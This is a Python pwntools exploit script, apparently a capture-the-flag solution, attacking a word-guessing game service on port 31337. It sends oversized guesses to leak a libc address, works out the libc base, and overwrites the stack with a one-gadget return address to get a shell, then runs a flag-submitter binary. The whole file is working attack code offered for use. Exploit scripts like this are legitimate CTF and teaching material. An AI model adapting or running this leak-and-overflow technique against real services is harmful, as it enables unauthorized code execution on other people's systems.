#!/usr/bin/env python3

from pwn import *
from struct import unpack_from

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

libc = ELF("./libc.so.6", checksec=False)

context.arch = "amd64"

class Exploit:

    def __init__(self) -> None:
        self.io = remote(HOST, int(PORT))

    def init(self, solution_len: int, nb_guess: int):
        self.io.sendlineafter(b" word be?\n", str(solution_len).encode())
        self.io.sendlineafter(b"player get?\n", str(nb_guess).encode())

    def send_guess(self, guess: bytes):
        self.io.sendlineafter(b"\n", guess)
        data = self.io.recvuntil(b"\nWhat", drop=True)
        leak = b""
        for elem in data.split(b"m "):
            if b" " not in elem:
                continue
            byte = elem.split(b" ")[0]
            leak += byte
        return leak

    def interactive(self):
        self.io.interactive()

    def close(self):
        self.io.close()


io = Exploit()

io.init(10, 7)

io.send_guess(bytes([0x6C])*10)

io.send_guess(b"A"*0x6c)
io.send_guess(b"A"*0x41)
io.send_guess(b"z"*0x41)

leak = io.send_guess(b"z"*ord('z'))

libc_leak = unpack_from("<Q", leak, offset=0x166)[0]
libc.address = libc_leak - 0x29d90

print("libc_leak @ %#x" % libc_leak)
print("libc_base @ %#x" % libc.address)

rp = b""
rp += p64(libc.address + 0x21af00 + 0x800)  # rbp
rp += p64(libc.address + 0xebcf1)

io.send_guess(b"D"*0x63 + rp.ljust(0x28, b'A'))

io.io.sendline("./submitter")
print(io.io.recvall())

io.close()
